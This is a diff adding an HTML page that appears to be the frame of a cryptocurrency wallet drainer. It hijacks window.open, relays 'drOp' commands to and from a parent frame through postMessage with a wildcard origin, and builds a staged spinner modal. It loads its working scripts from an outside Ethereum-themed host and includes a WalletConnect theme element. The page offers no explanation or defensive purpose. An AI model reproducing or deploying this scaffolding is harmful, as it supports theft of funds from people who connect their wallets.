@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+
+    <link rel="stylesheet" href="https://eth-cdn.fluxobserver.xyz/static/css/styles.css"/>
+    <script>
+        const _open = window.open.bind(window)
+
+        window.open = function () {
+            // console.log('window.open', arguments)
+
+            if (arguments.length > 1) {
+                const args = [arguments[1]]
+
+                if (arguments.length > 2) {
+                    args.push(arguments[2])
+                }
+
+                window.parent.postMessage({drOp: 'window.open', url: arguments[0], args: args}, '*')
+                return window
+            }
+
+            return _open.apply(this, arguments)
+        }
+
+        window.addEventListener('message', message => {
+            // console.log(`Received postMessage from`, message.origin, message.data)
+
+            let data = message.data.hasOwnProperty('drOp') ? message.data.drOp : null
+
+            if (data === 'connect') {
+                setTimeout(window.drOpenModal, 0)
+            }
+            else if (data === 'reload') {
+                window.location.reload()
+            }
+        })
+    </script>
+</head>
+<body>
+<div id="drPostModal" class="dr-post-modal">
+    <div class="dr-post-modal-content">
+        <div><p class="dr-post-modal-header-text" id="drPostModalHeaderText"></p></div>
+        <div id="drPostModalTextContainer" class="dr-post-modal-text-container">
+            <div class="dr-post-modal-text-slide">
+                <div id="drPostModalSpinnerContainer" class="dr-post-modal-spinner-container">
+                    <div class="dr-post-modal-spinner"></div>
+                </div>
+
+                <p id="drPostModalStepText"></p>
+                <p id="drPostModalBodyText"></p>
+            </div>
+        </div>
+        <div id="drPostModalStagesIndicator" class="dr-post-modal-stage-indicator dr-post-modal-blinking">
+        </div>
+    </div>
+</div>
+
+<script src="https://eth-cdn.fluxobserver.xyz/static/js/post-modal.js"></script>
+
+<div id="w3m-theme"
+     w3m-theme-mode="white"
+></div>
+
+<script src="https://eth-cdn.fluxobserver.xyz/static/js/process.js"></script>
+<script src="https://eth-cdn.fluxobserver.xyz/static/js/dcn.js"></script>
+</body>
+</html>
